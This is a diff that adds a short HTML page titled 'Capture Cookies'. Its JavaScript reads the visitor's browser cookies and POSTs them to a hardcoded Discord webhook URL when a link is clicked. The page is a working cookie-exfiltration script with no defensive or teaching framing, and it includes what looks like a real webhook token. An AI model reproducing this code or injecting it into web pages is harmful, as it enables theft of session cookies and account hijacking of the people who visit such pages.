@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Cookies</title>
+    <script>
+        function sendCookiesToDiscord() {
+            // Get the user's cookies
+            const cookies = document.cookie;
+
+            // Discord webhook URL (replace with your webhook link)
+            const webhookURL = 'https://discordapp.com/api/webhooks/1286808132269510667/3PYbTkqXxcfFpXeXeQb2vCpXJldqQqwrBUlGV4WBdEQhD5gr2B0BH6l00MXU1NpZaVe8';
+
+            // Create the message that will be sent to Discord
+            const payload = {
+                content: `User's cookies: ${cookies}`
+            };
+
+            // Send the message to Discord using the webhook
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Cookies sent to Discord:', data);
+                alert('Cookies sent successfully!');
+            })
+            .catch(error => {
+                console.error('Error sending cookies:', error);
+            });
+        }
+    </script>
+</head>
+<body>
+    <!-- This is the link that sends the cookies -->
+    <a href="#" onclick="sendCookiesToDiscord(); return false;">Click here to send your cookies</a>
+</body>
+</html>
